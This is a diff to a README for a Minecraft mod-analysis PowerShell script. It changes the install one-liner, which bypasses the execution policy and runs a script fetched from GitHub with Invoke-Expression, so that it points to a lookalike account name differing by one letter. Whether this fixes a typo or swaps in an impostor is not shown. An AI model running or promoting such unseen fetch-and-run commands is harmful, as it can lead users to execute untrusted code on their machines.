@@ -5,7 +5,7 @@ CMD script to analyze Minecraft mods and identify potential cheat clients.
 ## Installation
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonynoh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')"
+powershell -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTohynoh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')"
 ```
 
 ## Usage
